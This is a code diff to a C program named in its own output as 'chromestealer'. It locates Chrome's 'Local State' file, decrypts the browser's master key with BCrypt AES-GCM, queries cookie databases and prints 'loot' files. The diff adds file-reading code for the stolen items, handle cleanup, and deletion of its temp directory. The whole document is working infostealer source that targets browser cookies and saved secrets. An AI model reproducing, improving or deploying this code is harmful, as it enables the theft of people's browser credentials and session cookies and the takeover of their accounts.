@@ -13,8 +13,9 @@
 //C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Local State on Windows
 #define BUFSIZE 1024
 #define NUM_PATHS 9
-BCRYPT_KEY_HANDLE hKey; // GLOBAL VARIABLE!
-BCRYPT_AUTH_TAG_LENGTHS_STRUCT tagLens; //GLOBAL VARIABLE!
+BCRYPT_KEY_HANDLE hKey;
+BCRYPT_AUTH_TAG_LENGTHS_STRUCT tagLens; 
+BCRYPT_ALG_HANDLE hAlgorithm;
 
 typedef struct SQLStatements{
   char* extensionCookies;
@@ -91,7 +92,6 @@ PUCHAR AESGCMDecrypt(PUCHAR data, ULONG dataLen, PUCHAR iv, ULONG ivLen, PUCHAR 
 
 int initDecrypt(BYTE* key, DWORD keySize){
   NTSTATUS ntstatus;
-  BCRYPT_ALG_HANDLE hAlgorithm;
   ntstatus = BCryptOpenAlgorithmProvider(
     &hAlgorithm,
     BCRYPT_AES_ALGORITHM,
@@ -265,6 +265,7 @@ BYTE* getChromeKey(TCHAR* pszAppdata, DWORD* keyLen){
   };
   free(fileBuffer);
   free(encryptedKey);
+  CloseHandle(hFile);
   *keyLen = decData.cbData;
   return decData.pbData;
 }
@@ -465,13 +466,44 @@ int main(int argc, char *argv[]){
         return -1;
       }
     }else{
+      printf("%s:", loot[i]);
       //file isnt a sql database, just read it
-
+      HANDLE hFile = NULL;
+      hFile = CreateFileA(
+        dest,
+        GENERIC_READ,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+      );
+      if(hFile == INVALID_HANDLE_VALUE){
+        printf("[!] Error opening file, exiting....");
+        return -1;
+      }
+      DWORD filesize = 0;
+      DWORD bytesRead = 0;
+      filesize = GetFileSize(hFile, NULL);
+      BYTE* buffer = malloc(sizeof(BYTE) * (filesize + 1));
+      if(!ReadFile(
+        hFile,
+        buffer,
+        filesize,
+        &bytesRead,
+        NULL
+      )){
+        printf("[!] Error reading file, exiting");
+        return 1;
+      }
+      printf("%s", buffer);
+      free(buffer);
+      CloseHandle(hFile);
     }
     free(dest);
     free(src);
   };
-  //delete our temp directory
+  //cleanup
   SHFILEOPSTRUCTA op;
   op.hwnd = NULL;
   op.wFunc = FO_DELETE;
@@ -482,7 +514,9 @@ int main(int argc, char *argv[]){
   op.hNameMappings = NULL;
   op.lpszProgressTitle = NULL;
   SHFileOperationA(&op);
-  printf("chromestealer run done");
+  BCryptDestroyKey(hKey);
+  BCryptCloseAlgorithmProvider(hAlgorithm, 0);
   free(decodedKey);
+  printf("chromestealer run done");
   return 0;
 }
